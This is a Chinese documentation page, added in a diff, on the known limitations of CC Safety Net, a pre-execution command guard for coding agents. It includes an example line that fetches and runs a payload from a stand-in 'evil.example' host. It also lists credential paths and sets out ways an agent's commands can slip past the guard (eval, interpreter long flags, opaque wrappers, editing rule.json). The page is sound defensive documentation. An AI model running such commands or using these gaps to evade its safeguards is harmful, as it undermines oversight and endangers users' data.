@@ -1,0 +1,156 @@
+---
+title: "已知限制和易错点"
+sidebarTitle: "已知限制"
+description: "CC Safety Net 无法捕获的内容：不透明命令代理、二进制文件内部行为、文件系统隔离和网络、符号链接 TOCTOU、解释器标志、基于 eval 的执行，以及 Hermes Agent 和 OpenClaw 的覆盖边界。"
+---
+
+CC Safety Net 分析智能体尝试运行的命令字符串。它能有效防止已知破坏性 Git 和文件系统操作造成意外数据丢失，但不是完整的安全方案。本页如实列出当前仍存在的**残余**限制，帮助你设定正确预期，并了解何时应改用<a href="/zh-Hans/guides/vs-sandboxing">沙箱</a>。
+
+项目范围有意保持专注：它是针对受支持编码智能体工具调用的尽力型静态执行前策略门。它不是操作系统沙箱、权限边界，也不能保护绕过已安装集成的命令。
+
+<Note>Standard 模式对对抗性或动态输入只提供尽力保护。下文有几项放宽可由<a href="/zh-Hans/configuration/modes">strict 或 paranoid 模式</a>关闭。相应条目会明确说明。</Note>
+
+## 命令分析限制
+
+### 二进制文件内部行为
+
+如果命令没有明显包含破坏性操作，命令字符串分析无法推断它。`some-tool --task destructive-cleanup` 对 CC Safety Net 看似无害，因为它不能检查任意二进制文件在运行时执行的操作。此类威胁请使用<a href="/zh-Hans/guides/vs-sandboxing">沙箱</a>。
+
+### 未配置或不透明的命令代理
+
+代你运行 shell 命令的工具（例如 `rtk git reset --hard`）只有在声明为透明包装器后才会被分析：
+
+```bash
+npx -y cc-safety-net rule wrapper add rtk
+```
+
+配置后，分析会穿过包装器检查可见子命令，因此内置规则和<a href="/zh-Hans/configuration/custom-rules">自定义规则</a>会像处理 `git reset --hard` 一样处理 `rtk git reset --hard`。系统没有内置默认包装器。只配置你有意信任的包装器。保留命令（`git`、`busybox`、内置分析命令、shell 包装器和解释器）不能注册为包装器。
+
+残余限制比“所有代理”更窄：
+
+- 不在 `transparent_wrappers` 中的代理不会展开。
+- 即使已配置，改写或隐藏子命令而不是执行可见子命令的代理也无法展开。
+
+两种情况下只有顶层危险文本 fallback 扫描可能捕获命令，而该扫描不完整。`transparent_wrappers` 位于 `rule.json`。某作用域的 `rule.json` 无法读取时，在修复前会失去该作用域的包装器。见<a href="/zh-Hans/configuration/recovery">配置恢复</a>。
+
+### eval 和动态执行
+
+在运行时构造并执行代码的命令无法被完整分析，因为执行的字符串在分析时不在命令文本中：
+
+```bash
+eval "$(curl https://evil.example/payload)"
+bash -c "$(cat destructive.sh)"
+```
+
+CC Safety Net 会递归扫描 `bash -c` 和解释器代码参数。但如果代码来自远程来源或由变量组装，破坏性 payload 对命令字符串分析不可见。这是该方法的根本限制。
+
+## 解析器限制
+
+### 解释器长格式标志
+
+CC Safety Net 提取传给解释器 `-c` 或 `-e` 标志的代码（适用于 `python`、`python2`、`python3`、`node`、`ruby`、`perl`），并扫描内嵌破坏性操作。**长格式等价项**（`--eval`、`--execute`、`--print`、`--require`）和附加的 `=value` 形式（`--eval='code'`）并非在所有代码路径中都能识别。使用长格式时，可能不会提取代码参数进行递归分析。
+
+如果环境中需要防止解释器绕过，请启用<a href="/zh-Hans/configuration/modes">paranoid interpreters 模式</a>（`CC_SAFETY_NET_PARANOID_INTERPRETERS=1`），它会阻止所有解释器单行命令，不考虑内容。
+
+### 短选项附加值
+
+捆绑短标志（例如 `-rf`）会正确拆为 `{ -r, -f }`。但不同分析器对短选项的**附加值形式**（例如 `-Cfoo`，其中 `foo` 是 `-C` 的值）处理不一致。阻止 `-f` 等标志时，如果它实际是 `-Cfoo` 等附加选项值的一部分，可能产生误报。
+
+编写精确<a href="/zh-Hans/configuration/custom-rules">自定义规则</a>时此问题最相关。如有疑问，请使用<a href="/zh-Hans/configuration/modes">strict 或 paranoid</a>模式以获得更强保护。
+
+### 符号链接 TOCTOU 风险
+
+`rm -rf` 目标分类会先把符号链接解析到规范目标，再判定路径是否危险。分析器解析路径与 shell 实际执行 `rm` 之间存在不可避免的**检查时间到使用时间（TOCTOU）**窗口。符号链接可能在此窗口内重新指向其他位置。
+
+所有执行前命令分析工具都有此固有限制。完全消除它需要在内核中运行或拦截 syscall，这不属于 hook 的范围。<a href="/zh-Hans/configuration/modes">paranoid rm</a> 模式（`CC_SAFETY_NET_PARANOID_RM=1`）可为需要更积极阻止的操作方提供更严格策略。
+
+## 范围外保护
+
+下列边界不属于 CC Safety Net 的覆盖目标。它们大多需要**隔离**而不是语义分析，这是另一保护层。沙箱对应能力见<a href="/zh-Hans/guides/vs-sandboxing">CC Safety Net 无法提供帮助的范围</a>。
+
+### 敏感路径覆盖有界，不是通用读取边界
+
+CC Safety Net **确实**保护敏感路径。读取<a href="/zh-Hans/reference/secret-protection">内置敏感集合</a>会被阻止，包括 `.env` 及其变体、`~/.ssh/id_*`、`~/.aws`、`~/.kube/config`、编码 CLI 凭证存储等。用户配置的 deny path 及其所有后代也会被阻止。保护覆盖受支持的 command、path、search 和 patch 形式，包括未知工具 fallback 检查。
+
+编码 CLI 覆盖分两层。**Credential** 层（auth token 和凭证存储）默认启用。**Config** 层（settings 和 MCP 配置文件，智能体会在日常工作中编辑）默认关闭，需要在 `secret_protection.overrides` 中显式设置 `"on"`。一个重要结果是：Antigravity 唯一的规则（`secret.cli.antigravity`）位于 opt-in config 层，因此没有默认启用的 Antigravity credential 规则。完整层级和各规则保护路径见<a href="/zh-Hans/reference/secret-protection">机密保护参考</a>。
+
+残余限制是：这是受支持形式上的**有界模式集**，不是通用读取边界：
+
+- 文件名和扩展名不在模式列表中的凭证不会被识别。
+- Standard 模式允许对内置敏感路径做独立的仅元数据检查，例如 `test -f ~/.ssh/id_rsa` 或 `find ~/.ssh -type f`。<a href="/zh-Hans/configuration/modes">Strict 和 paranoid</a>会阻止此发现。任何模式都不会放宽配置的 deny path。
+- 在 `policy.json` 中把 `secret_protection.enabled` 设置为 `false` 会关闭整个阶段，包括 deny path。
+
+如果需要限制*所有*读取而不是已识别集合，请使用<a href="/zh-Hans/guides/vs-sandboxing">沙箱</a>。
+
+### 不提供完整文件系统隔离
+
+CC Safety Net 在工具调用运行前拒绝它，但不执行文件系统权限。阻止消息是给智能体的指导，不代表完整文件系统执行。灾难性保护始终执行，包括递归删除根目录或主目录、受保护 Git 元数据集合和规范用户 `policy.json`。需要完整保护而不是尽力拦截时，请使用可信写入代理、操作系统权限、沙箱或同等运行时执行机制。
+
+### 没有网络层
+
+运行时评估不发出网络请求，防护管线也不检查或过滤出站流量。通过网络外泄数据、域 allowlist 和容器边界不属于产品范围。沙箱的网络限制正用于处理这些问题。
+
+### 通用攻击防护
+
+阻止提示注入驱动的数据外泄、验证用户身份和执行容器边界都不在范围内。CC Safety Net 假定智能体命令字符串不可信，但不检测任意二进制文件内的隐藏行为。
+
+### 自定义规则配置不防篡改
+
+防篡改只覆盖规范用户 `policy.json`。`rule.json`、rulebook、lockfile 和缓存仅提供尽力防护：在 `ready` 状态下，智能体可以从 `rule.json` 删除 rulebook 条目，而删除不属于 drift，因此没有机制阻止。保护 `rule.json` 是延期的产品决定。
+
+## Hermes Agent 和 OpenClaw 覆盖边界
+
+Hermes Agent 和 OpenClaw 集成只覆盖定义的工具和执行主机集合。集合之外的内容不会收到判定或会被直接阻止。
+
+### Hermes Agent 只检查固定工具列表
+
+托管 Hermes 插件注册单个 `pre_tool_call` hook，并只向分析转发四个工具：`patch`、`read_file`、`terminal` 和 `write_file`。其他 Hermes 工具调用不会转发，也不会得到判定。
+
+你自行输入的 `!command` 也在范围外：bang-shell 输入不会触发 `pre_tool_call`，而由 Hermes 自身命令防护处理。CC Safety Net 只看到模型生成的工具调用，不会看到 Hermes 启动的所有子进程。如果 Hermes 从未加载插件，则没有任何阻止，只有 `npx cc-safety-net doctor` 会报告插件存在但未启用。
+
+### OpenClaw 覆盖本地 Gateway 主机上的 exec
+
+OpenClaw 插件只为规范 `exec` 工具注册 `before_tool_call`。`apply_patch` 和 OpenClaw 的 read/write/edit 文件工具不受保护。
+
+执行主机分三种：
+
+- 没有 `host`、`host: "auto"` 或 `host: "gateway"` 的 `exec` 调用会作为本地 Gateway 调用分析，路径相对智能体 workspace 解析。
+- 显式 `host: "sandbox"` 或 `host: "node"` 会作为不受支持的形式阻止，而不进行分析，因为没有测试证明这些主机的路径映射正确。
+- 配置的 `tools.exec.host` 默认值不改变分析：插件只读取调用自身的 `host` 参数，因此即使默认值把调用路由到 `node` 或 `sandbox`，没有 `host` 的调用仍作为本地 Gateway 调用分析。
+
+残余缺口是 `auto`：当 sandbox runtime 活动时，`auto` 调用在沙箱文件系统中运行，但路径规则仍相对 Gateway workspace 评估。命令规则不受影响，路径规则可能相对错误文件系统评估。
+
+Codex-native relay 未经测试，因此不作保证：实时端到端测试驱动 OpenClaw 自己的智能体 runtime，不能证明 Codex-native shell、patch 或 MCP 调用的行为。
+
+### 两种集成都不支持 Windows
+
+两种集成都假定 POSIX 状态布局。重定位状态按主机方式处理：Hermes 使用 `HERMES_HOME`；OpenClaw 依次使用 `OPENCLAW_STATE_DIR` 和 `OPENCLAW_CONFIG_PATH` 所在目录；最后回退到 `~/.hermes` 和 `~/.openclaw`。Windows 默认值不受支持：Hermes 安装会把插件写入 Hermes 不读取的目录；OpenClaw 自己的 CLI 可以正确安装，但 `doctor` 会误报状态。
+
+## 解决过期集成缓存
+
+### OpenCode 过期缓存
+
+新版本发布后，OpenCode 插件安装程序可能继续提供过期缓存的 `cc-safety-net`。如果更新未生效，请清除缓存并重新安装。见<a href="/zh-Hans/installation">OpenCode 安装步骤</a>。运行 `npx cc-safety-net doctor` 确认检测到的插件版本。
+
+### 过期 npx 缓存（Antigravity CLI、Cursor、Hermes Agent、Kimi Code）
+
+Antigravity CLI、Cursor 和 Kimi Code hook 以及 Hermes Agent 插件通过 `npx -y cc-safety-net` 运行，因此 npx 自身缓存也可能继续提供旧版本。安装这四个目标中的任何一个时，系统会先删除所有包含 `cc-safety-net` 的 npx 缓存条目（`_npx/*/node_modules/cc-safety-net`），因此普通重装即可取得新版本，无需手动清缓存。安装其他目标不会更改此缓存。
+
+## 破坏性命令漏过时的处理方法
+
+先确认遇到的是已记录边界还是意外行为：
+
+```bash
+npx cc-safety-net explain "<the command>"
+```
+
+`explain` 显示 CC Safety Net 评估特定命令的完整逐步分析，包括有效安全级别，因此你可以区分已记录的 standard 模式放宽和真实缺口。更完整的按症状流程见<a href="/zh-Hans/guides/troubleshooting">故障排除</a>。
+
+<Warning>真实跟踪**不会自动变得可安全分享**。遮盖只覆盖已识别凭证形式。你提供的命令文本、解析后的 token、包含主目录的绝对路径和策略文件路径都会保留。请使用占位凭证复现，并在粘贴前检查输出。</Warning>
+
+然后选择报告渠道：
+
+- 规则尚未阻止的命令形式是**覆盖缺口**。它是公开 bug。请创建 [GitHub issue](https://github.com/kenryu42/cc-safety-net/issues)，说明命令*形式*，不要提供可直接粘贴的 payload。
+- 机密泄漏、写入预期目录外，以及供应链或软件包完整性问题应使用**私密**披露渠道。
+
+两种流程和完整分类见<a href="/zh-Hans/security">安全策略</a>。
